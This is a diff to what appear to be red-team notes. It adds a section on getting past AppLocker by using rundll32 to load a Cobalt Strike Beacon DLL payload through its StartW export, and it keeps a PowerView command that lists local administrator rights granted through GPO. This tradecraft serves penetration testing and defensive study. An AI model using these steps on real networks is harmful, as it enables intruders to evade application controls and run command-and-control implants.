@@ -72,3 +72,9 @@ Enumerate the machines where a specific domain user/group is a member of a speci
 ```
 powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
 ```
+
+## Applocker sus
+
+As previously mentioned, DLL enforcement is not commonly enabled which allows us to call exported functions from DLLs on disk via rundll32.  Beacon's DLL payload exposes several exports including DllMain and StartW.  These can be changed in the Artifact Kit under src-main, dllmain.def.
+
+C:\Windows\System32\rundll32.exe http_x64.dll,StartW
